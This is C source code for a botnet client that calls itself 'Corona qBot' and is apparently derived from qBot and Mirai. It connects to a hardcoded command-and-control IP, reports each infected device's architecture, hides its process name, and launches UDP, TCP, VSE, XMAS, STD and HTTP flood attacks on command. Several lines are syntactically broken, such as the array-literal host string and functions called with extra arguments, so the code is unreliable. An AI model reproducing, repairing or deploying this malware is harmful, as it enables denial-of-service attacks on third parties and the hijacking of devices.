/*
	~ Corona qBot By vSparkzyy ~
	   We dont use triggers
			~ Methods ~
			UDP IP PORT TIME 32 0 10		| Org UDP Flood
			TCP IP PORT TIME FLAGS			| Org TCP Flood With Less Options
			STD IP PORT TIME				| Standard UDP Flood By vSparkzyy
			VSE IP PORT TIME				| VSE Flood From Mirai
			XMAS IP PORT TIME				| Org XMAS Flood From Mirai
			HTTP IP PORT TIME METHOD		| HTTP Flood By vSparkzyy
			hahawekillyou 				    | Kills All Bot PIDs
*/

#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/ip.h>
#include <sys/ioctl.h>
#include <time.h>
#include <sys/prctl.h>
#include <fcntl.h>

char *cnc_host = [81.7.7.10];
uint16_t bot_port = 60001;
#define host1 81
#define host2 7
#define host3 7
#define host4 10

uint32_t *pids;
uint64_t numpids = 0;
int MainSocket = 0;

char *getBuild() {
#if defined(__x86_64__) || defined(_M_X64)
    return "ROOTS";
#elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "ARM";
#elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "ARM"
#elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "ARM";
#elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "ARM";
#elif defined(mips) || defined(__mips__) || defined(__mips)
    return "MIPS";
#elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
    return "MIPSEL";
#else
    return "UNKNOWN";
#endif
}

void registermydevice(char *JoinName)
{
    if(JoinName == NULL)
    {
        JoinName = getBuild();
    }
    char registermsg[100];
    char name[100];
    sprintf(name, "arch %s\r\n", getBuild());
    sprintf(registermsg, "\e[0m\e[0;31m[\e[0;36mCorona\e[0;31m]\e[0m Device Joined As [%s] Arch: [%s]\r\n", JoinName, getBuild());
    write(MainSocket, name, strlen(name));
    write(MainSocket, registermsg, strlen(registermsg));
}

char *Connection(char *namezz)
{
    struct sockaddr_in vSparkzyy;
	int attempt = 0;		
	printf("\r\n[Resolve] Attempting To grab Ipv4 From %s\r\n", host1,host2,host3,host4);
	resolve_http();
	if(cnc_host == NULL)
	{
		printf("[Resolve] Unable To Resolve Host.\r\n");
		strcpy(cnc_host, host1,host2,host3,host4);
	}
	else
	printf("[Resolve] Using %s as Host \r\n", cnc_host);
	retryme:
	sleep(5);
	attempt++;
	printf("[Attempting] To Connect To CNC On Attempt: %d\r\n", attempt);
    MainSocket = socket(AF_INET, SOCK_STREAM, 0);
    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt;
    long arg = fcntl(MainSocket, F_GETFL, NULL);
    arg |= O_NONBLOCK;
    fcntl(MainSocket, F_SETFL, arg);
    vSparkzyy.sin_family = AF_INET;
    vSparkzyy.sin_port = htons(bot_port);
    vSparkzyy.sin_addr.s_addr = inet_addr(host1,host2,host3,host4);
    if(connect(MainSocket, (struct sockaddr *)&vSparkzyy, sizeof(vSparkzyy)) == -1)
    {
        if (errno == EINPROGRESS)
        {
            tv.tv_sec = 30;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(MainSocket, &myset);
            if (select(MainSocket + 1, NULL, &myset, NULL, &tv) > 0)
            {
                lon = sizeof(int);
                getsockopt(MainSocket, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                if (valopt)
                    goto retryme;
            }
            else
                goto retryme;
        }
        else
            goto retryme;
    }
	printf("[Connected!] Successfully Connected To CNC On Attempt: %d\r\n", attempt);
	registermydevice(namezz);
    arg = fcntl(MainSocket, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(MainSocket, F_SETFL, arg);
    return 0;
}

int resolve_http()
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;

    if ((he = gethostbyname(host1,host2,host3,host4)) == NULL)
    {
        herror("gethostbyname");
        return 1;
    }
    addr_list = (struct in_addr **) he->h_addr_list;

    for(i = 0; addr_list[i] != NULL; i++)
    {
        strcpy(cnc_host, inet_ntoa(*addr_list[i]));
        return 0;
    }

    return 1;
}
void proc_cmd(int argc, unsigned char **argv)
{
    if(!strcmp(argv[0], "UDP"))
    {
        if(argc < 6)return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        int packetsize = atoi(argv[5]);
        int pollinterval = (argc > 6 ? atoi(argv[6]) : 1000);
        int sleepcheck = (argc > 7 ? atoi(argv[7]) : 1000000);
        int sleeptime = (argc > 8 ? atoi(argv[8]) : 0);
        if(!fork())
        {
            printf("[UDP] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            udpflood(ip, port, time, spoofed, packetsize, pollinterval, sleepcheck, sleeptime);
            _exit(0);
        }
        return;
    }
	
	if(!strcmp(argv[0], "VSE"))
	{
		unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
		if(!fork())
		{
			printf("[VSE] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            vseattack(ip, port, time);
            _exit(0);
		}
	}
	
    if(!strcmp(argv[0], "HTTP"))
    {
        unsigned char *target = argv[1];
        int port = atoi(argv[2]);
        int duration = atoi(argv[3]);
        unsigned char *method = argv[4];
        if(!fork())
        {
            printf("[HTTP] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            http_attack(target, port, duration, method);
            _exit(0);
        }
        return;
    }
    if(!strcmp(argv[0], "TCP"))
    {
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        unsigned char *flags = argv[4];
        if(!fork())
        {
            printf("[TCP] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            SendTCP(ip, port, time, flags);
            _exit(0);
        }
        return;
    }

    if(!strcmp(argv[0], "STD") || !strcmp(argv[0], "std"))
    {
        if(argc < 4) return;
        unsigned char *target = argv[1];
        int port = atoi(argv[2]);
        int duration = atoi(argv[3]);
        if(!fork())
        {
            printf("[STD] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            std_attack(target, port, duration);
            _exit(0);
        }
        return;
    }

    if(!strcmp(argv[0], "XMAS"))
    {
        if(argc < 4) return;
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        if(!fork())
        {
            printf("[XMAS] Attack Being Sent To: %s For: %d Seconds\r\n", argv[1], atoi(argv[3]));
            xmas(ip, port, time);
            _exit(0);
        }
        return;
    }

    if(strstr(argv[0], "hahawekillyou"))
    {
        printf("\r\n[Corona] Disconnected! \r\n");
        exit(0);
    }
}

#define NONBLOCK(fd) (fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0)))
#define LOCALHOST (inet_addr("127.0.0.1"))
static void ensure_bind(uint32_t bind_addr) // no i am not using the same single instance as the mirai one.
{
    printf("Attempting to bind on address %d.%d.%d.%d\n", bind_addr & 0xff, (bind_addr >> 8) & 0xff, (bind_addr >> 16) & 0xff, (bind_addr >> 24) & 0xff);
    int fd = -1;
    struct sockaddr_in addr;
    int ret = 0;
    int e = 0;
    fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd == -1)
    {
        return;
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(8888);
    addr.sin_addr.s_addr = bind_addr;
    NONBLOCK(fd);
    errno = 0;
    ret = bind(fd, (struct sockaddr *)&addr, sizeof(addr));
    e = errno;
    // Bind failed
    if(ret == -1 && e == EADDRNOTAVAIL)
    {
        close(fd);
        sleep(1);
        ensure_bind(LOCALHOST);
        return;
    }
    if(ret == -1 && EADDRINUSE)
    {
        printf("Determined we already have a instance running on this system!\n");
        exit(1);
    }
    // Listen with the TCP backlog of 1
    listen(fd, 1);
    printf("Binded and listening on address %d.%d.%d.%d\n", bind_addr & 0xff, (bind_addr >> 8) & 0xff, (bind_addr >> 16) & 0xff, (bind_addr >> 24) & 0xff);
    return;
}

static uint32_t local_addr(void)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd == -1)
    {
        return 0;
    }
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);
    connect(fd, (struct sockaddr *)&addr, sizeof(addr));
    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);
#ifdef DEBUG
    printf("Local address %d.%d.%d.%d\n", addr.sin_addr.s_addr & 0xff, (addr.sin_addr.s_addr >> 8) & 0xff, (addr.sin_addr.s_addr >> 16) & 0xff, (addr.sin_addr.s_addr >> 24) & 0xff);
#endif
    return addr.sin_addr.s_addr;
}

void recv_buf()
{
    char buf[512];
    while(read(MainSocket,buf,sizeof(buf)))
    {
        int r, argcount=0;
        unsigned char *buffer[12 + 1] = {0};
        char *split;
        for(split = strtok(buf," "); split != NULL; split = strtok(NULL, " "))
        {
            buffer[argcount++] = malloc(strlen(split) + 1);
            strcpy(buffer[argcount-1], split);
            if(argcount >20) {
                argcount=0;
                break;
            }
        }
        if(argcount >0) proc_cmd(argcount, buffer);
        for(r=0; r < argcount; r++)
        {
            free(buffer[r]);
        }
    }
}

int main(int argc, unsigned char * argv[]) {
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    uint32_t local;
    local = local_addr();
    ensure_bind(local);
	if(fork() >0) return;
    resolve_http();
    char * hideme = "";
    strncpy(argv[0], "", strlen(argv[0]));
    sprintf(argv[0], hideme);
    prctl(PR_SET_NAME, (unsigned long) hideme, 0, 0, 0);
    srand(time(NULL) ^ getpid());
    while (1) {
        Connection(argv[1]);
        recv_buf();
    }
}
